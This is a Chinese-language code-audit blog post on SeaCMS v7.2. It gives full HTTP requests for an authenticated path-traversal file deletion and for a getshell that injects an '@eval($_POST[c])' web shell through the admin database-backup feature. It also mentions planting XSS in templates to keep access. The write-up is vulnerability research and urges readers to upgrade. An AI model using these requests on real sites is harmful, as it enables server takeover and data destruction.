---
title: "Seacmsv7.2任意文件删除&Getshell"
date: 2019-01-10T21:17:21+08:00
draft: false
tags: ['getshell']
categories: ['代码审计']
---

海洋cms是为解决站长核心需求而设计的视频内容管理系统，适用于各大视频站点，支持自定义模板和解析接口，是各大视频站长的不错选择之一。官方版本已经在2019年1月10日更新版本到v8.1，请尽快更新版本。

<!--more-->

### 安装
![](https://y4er.com/img/uploads/20190509168375.jpg "安装")
版本信息查看
```http
http://127.0.0.1/seacms/data/admin/ver.txt
```
在安装完之后提示我后台地址为`http://127.0.0.1/seacms/shwpap`，可以看出后缀是随机命名的。
在网站目录搜索`重要`跟进代码
![](https://y4er.com/img/uploads/20190509164151.jpg)
可以看到有一个`randomkeys(6)`方法，继续跟进

![](https://y4er.com/img/uploads/20190509168190.jpg)

后台目录是由程序生成的随机6位字符，可以用burp爆破。不过基数过大，不建议。

![](https://y4er.com/img/uploads/20190509169761.jpg)

### 任意文件删除
`seacms/shwpap/admin_template.php`
![](https://y4er.com/img/uploads/20190509167138.jpg)
可以看到只允许操作路径前11位是`$dirTemplate`变量也就是`../templets`的文件，那么我们可以尝试用`../`来操作

![](https://y4er.com/img/uploads/20190509167239.jpg)

通过edit可以读文件，但是因为程序中写死了，只能读取html、html、js、css、txt文件，不能读取php文件，实战中我们可以通过编辑模板插入xss维持权限。

我们尝试用`del`操作，删除`install\install_lock.txt`文件：

![](https://y4er.com/img/uploads/20190509167072.jpg)

```http
GET /seacms/shwpap/admin_template.php?action=del&filedir=../templets/../install/install_lock.txt HTTP/1.1
Host: 127.0.0.1
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1/seacms/shwpap/admin_template.php?action=custom
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=9vlafp1q6b4cro69qk7bhged06
Connection: close


```

### getshell

可上传类型程序写死，上传文件后缀名白名单写死，sql高级助手执行sql语句双waf，那么真正的突破口出现在备份上

![](https://y4er.com/img/uploads/20190509166250.jpg)

备份完之后备份文件是php后缀，虽然避免了备份文件被下载，但是真正getshell的点也出在这了。

为了请求包简洁，我们只勾选一个表`sea_admin`，修改包中请求的`tablename`参数为我们的恶意代码，然后访问备份路径下的`config.php`文件就可以得到我们的shell了。
poc如下：
```http
POST /seacms/shwpap/ebak/phomebak.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 260
Cache-Control: max-age=0
Origin: http://127.0.0.1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1/seacms/shwpap/ebak/ChangeTable.php?mydbname=seacms&keyboard=sea
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=9vlafp1q6b4cro69qk7bhged06
Connection: close

phome=DoEbak&mydbname=seacms&baktype=0&filesize=1024&bakline=1000&autoauf=1&bakstru=1&dbchar=utf8&bakdatatype=1&mypath=seacms_2019&insertf=replace&waitbaktime=0&readme=&tablename%5B%5D=@eval($_POST[c])&chkall=on&Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD
```
![](https://y4er.com/img/uploads/20190509165279.jpg)

注意看路径，以及代码的闭合状况。经过测试，`@eval($_POST[c])`是刚好可用的payload。



参考链接

1. https://xz.aliyun.com/t/3805
2. https://www.seacms.net/doc/logs/
3. http://ahdx.down.chinaz.com/201901/seacms_v7.1.zip